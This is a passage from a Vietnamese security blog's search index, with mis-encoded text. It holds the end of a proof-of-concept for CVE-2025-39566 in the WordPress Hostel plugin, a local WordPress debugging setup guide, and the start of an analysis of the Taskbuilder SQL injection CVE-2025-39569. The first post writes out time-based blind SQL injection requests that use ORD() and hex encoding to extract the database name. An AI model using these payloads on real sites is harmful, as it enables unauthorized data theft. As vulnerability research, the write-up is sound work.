SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Taskbuilder c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.0.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) v√† v4.0.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n '...'. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ OR, AND,...) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/admin/projects/get_users.php\nTrong phi√™n b·∫£n v4.0.1, bi·∫øn $proj_id sau khi escape ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u truy v·∫•n m√† kh√¥ng c√≥ d·∫•u nh√°y ƒë∆°n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.2\u0026rdquo; }\nB·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y 